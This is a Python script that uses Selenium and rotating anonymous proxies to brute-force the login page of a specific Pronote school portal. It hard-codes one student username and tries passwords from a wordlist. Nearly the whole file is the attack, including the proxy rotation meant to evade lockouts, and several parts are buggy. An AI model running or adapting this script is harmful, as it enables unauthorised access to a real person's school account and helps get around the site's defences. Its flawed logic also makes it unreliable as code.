import proxyscrape
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from sys import argv
from multiprocessing import Process


def get_proxy_list(proxy_number):
    proxy_list = []
    collector = proxyscrape.create_collector("default", "http")
    for i in range(proxy_number):
        proxygrabber = collector.get_proxy({"anonymous": True})
        proxy = proxygrabber.host + ":" + proxygrabber.port
        proxy_list.append(proxy)
    return proxy_list


def rotate_proxies():
    proxy_list = get_proxy_list(2)
    length = len(proxy_list)
    proxy_id = 0
    if proxy_id == length:
        proxy_id = 0
    else:
        proxy_id += 1
    proxies = proxy_list[proxy_id]
    return proxies


def output():
    print("Username: " + username)
    print("")
    if password_found == True:
        print("The password for user " + username + "is" + current_pass)
    else:
        print("Current password: " + current_pass)

    # bruteforce(str(argv[1]), current_pass, str(argv[3]), str(argv[4]))


def bruteforce(username, wordlist_path, page):
    proxy_use = 0
    proxy = get_proxy_list(2)[0]
    password_found = False
    chrome_options = webdriver.ChromeOptions()
    while password_found != True:
        # chrome_options.add_argument('--headless')
        chrome_options.add_argument('--proxy-server=%s' % proxy)
        # chrome_options.add_experimental_option("detach", True)
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://3900001g.index-education.net/pronote/" + page + ".html")
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, 'id_53')))
        # loaded = False
        # while loaded != True:
        #     try:
        #         WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="id_47"]')))
        #         loaded = False
        #     except:
        #         driver.refresh()
        #         loaded = True
        username_field = driver.find_element_by_xpath('//*[@id="id_53"]')
        password_field = driver.find_element_by_xpath('//*[@id="id_54"]')
        login_button = driver.find_element_by_xpath('//*[@id="id_43"]')
        username_field.send_keys(username)
        wordlist = open(wordlist_path)
        for password in wordlist:
            current_pass = password
            password_field.send_keys(current_pass)
            login_button.click()
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located(
                    (By.XPATH,
                     '//*[@id="GInterface.Instances[0].Instances[0]"]/div/div[2]/div[1]/img[@style="width:100%;"]')))
                password_found = True
                return current_pass
            except:
                password_found = False
                driver.close()
            proxy_use += 1
            if proxy_use == 4:
                proxy = rotate_proxies()
            output()

bruteforce("mootoosamy", "wordlist.txt", "eleve")
# if __name__ == '__main__':
#     procs = 4
#     jobs = []
#     for i in range(0, procs):
#         process = Process(target=bruteforce, args=("mootoosamy", "wordlist.txt", "eleve"))
#         jobs.append(process)
#
#     for j in jobs:
#         j.start()
#
#     for j in jobs:
#         j.join()